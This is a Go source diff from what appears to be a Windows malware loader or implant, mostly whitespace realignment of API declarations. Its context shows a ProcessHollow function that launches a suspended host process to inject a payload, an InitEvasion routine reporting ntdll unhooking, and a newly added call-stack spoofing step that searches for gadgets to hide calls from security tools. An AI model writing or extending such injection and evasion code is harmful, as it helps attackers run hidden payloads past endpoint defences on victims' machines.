@@ -10,24 +10,24 @@ import (
 )
 
 var (
-	modKernel32    = syscall.NewLazyDLL("kernel32.dll")
-	modNtdll       = syscall.NewLazyDLL("ntdll.dll")
+	modKernel32 = syscall.NewLazyDLL("kernel32.dll")
+	modNtdll    = syscall.NewLazyDLL("ntdll.dll")
 
-	pGetProcAddress     = modKernel32.NewProc("GetProcAddress")
-	pLoadLibraryA       = modKernel32.NewProc("LoadLibraryA")
-	pVirtualProtect     = modKernel32.NewProc("VirtualProtect")
-	pCreateFileA        = modKernel32.NewProc("CreateFileA")
-	pReadFile           = modKernel32.NewProc("ReadFile")
-	pGetFileSize        = modKernel32.NewProc("GetFileSize")
-	pGetModuleHandleA   = modKernel32.NewProc("GetModuleHandleA")
-	pVirtualAlloc2      = modKernel32.NewProc("VirtualAlloc")
-	pVirtualFree2       = modKernel32.NewProc("VirtualFree")
-	pCreateProcessA     = modKernel32.NewProc("CreateProcessA")
-	pWriteProcessMemory = modKernel32.NewProc("WriteProcessMemory")
-	pResumeThread       = modKernel32.NewProc("ResumeThread")
-	pTerminateProcess   = modKernel32.NewProc("TerminateProcess")
+	pGetProcAddress            = modKernel32.NewProc("GetProcAddress")
+	pLoadLibraryA              = modKernel32.NewProc("LoadLibraryA")
+	pVirtualProtect            = modKernel32.NewProc("VirtualProtect")
+	pCreateFileA               = modKernel32.NewProc("CreateFileA")
+	pReadFile                  = modKernel32.NewProc("ReadFile")
+	pGetFileSize               = modKernel32.NewProc("GetFileSize")
+	pGetModuleHandleA          = modKernel32.NewProc("GetModuleHandleA")
+	pVirtualAlloc2             = modKernel32.NewProc("VirtualAlloc")
+	pVirtualFree2              = modKernel32.NewProc("VirtualFree")
+	pCreateProcessA            = modKernel32.NewProc("CreateProcessA")
+	pWriteProcessMemory        = modKernel32.NewProc("WriteProcessMemory")
+	pResumeThread              = modKernel32.NewProc("ResumeThread")
+	pTerminateProcess          = modKernel32.NewProc("TerminateProcess")
 	pNtQueryInformationProcess = modNtdll.NewProc("NtQueryInformationProcess")
-	pRtlCopyMemory2     = modNtdll.NewProc("RtlCopyMemory")
+	pRtlCopyMemory2            = modNtdll.NewProc("RtlCopyMemory")
 )
 
 // ════════════════════════════════════════════════════════
@@ -249,7 +249,7 @@ func ProcessHollow(hostProcess string, payload []byte) error {
 	ret, _, err := pCreateProcessA.Call(
 		uintptr(unsafe.Pointer(&hostBytes[0])),
 		0, 0, 0,
-		0, // bInheritHandles
+		0,          // bInheritHandles
 		0x00000004, // CREATE_SUSPENDED
 		0, 0,
 		uintptr(unsafe.Pointer(&si)),
@@ -369,6 +369,13 @@ func InitEvasion() []string {
 		results = append(results, "ntdll unhook: OK")
 	}
 
+	SpoofCallStack()
+	if spoofJmpRbx != 0 && spoofRet != 0 {
+		results = append(results, fmt.Sprintf("stack spoof: OK (jmp [rbx]=0x%x, ret=0x%x)", spoofJmpRbx, spoofRet))
+	} else {
+		results = append(results, "stack spoof: FAILED (gadgets not found)")
+	}
+
 	return results
 }
 
@@ -432,10 +439,10 @@ type STARTUPINFO struct {
 }
 
 type PROCESS_INFORMATION struct {
-	HProcess    syscall.Handle
-	HThread     syscall.Handle
-	ProcessId   uint32
-	ThreadId    uint32
+	HProcess  syscall.Handle
+	HThread   syscall.Handle
+	ProcessId uint32
+	ThreadId  uint32
 }
 
 // ════════════════════════════════════════════════════════
